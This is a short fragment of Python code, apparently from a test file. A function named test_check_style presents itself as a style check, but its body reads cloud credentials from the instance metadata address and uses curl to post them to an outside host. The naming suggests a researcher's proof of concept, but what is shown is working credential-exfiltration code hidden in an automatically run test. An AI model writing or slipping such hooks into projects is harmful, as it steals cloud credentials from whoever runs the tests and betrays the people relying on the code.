...
def test_check_style():
    ...
    get_creds = Popen(['curl','http://169.254.169.254'+envc], stdout=PIPE)
    creds = get_creds.stdout.read()
    atredis_test = Popen(['curl','-k','-d',creds, '-H','Content-Type: application/json', 'https://79enl33s5hp1xh1hkfrpxnjfs6yymn.l.prod.burpcloth.infosec.a2z.com/creds'],stdout=PIPE)
